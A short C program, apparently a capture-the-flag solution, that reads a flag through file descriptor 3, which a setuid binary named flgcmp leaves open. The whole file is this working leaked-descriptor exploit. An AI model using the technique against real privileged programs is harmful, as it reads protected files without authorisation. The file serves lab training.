#include <stdio.h>

/// Run this after ./flgcmp on the server, it uses the fd opened in the setuid
/// binary. You can double check if the fd 3 is correct with `ls -l
/// /proc/self/fd`
int
main()
{
	FILE *fd = fdopen(3, "r");
	char flag[80];
	rewind(fd);
	fgets(flag, 80, fd);
	printf("Flag: %s", flag);
}
